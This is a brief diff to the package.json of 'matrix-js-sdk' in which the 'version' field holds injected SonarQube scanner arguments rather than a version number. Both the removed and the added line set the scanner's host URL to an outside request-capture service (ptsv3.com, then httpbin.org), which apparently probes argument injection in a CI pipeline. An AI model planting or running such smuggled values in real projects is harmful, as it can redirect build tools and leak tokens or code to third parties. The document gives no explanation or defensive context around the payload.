@@ -1,6 +1,6 @@
 {
     "name": "matrix-js-sdk",
-    "version": "0 -Dsonar.verbose=true -Dsonar.host.url=http://ptsv3.com/t/191328907/post",
+    "version": "0 -Dsonar.verbose=true -Dsonar.host.url=https://httpbin.org/anything",
     "description": "Matrix Client-Server SDK for Javascript",
     "engines": {
         "node": ">=18.0.0"
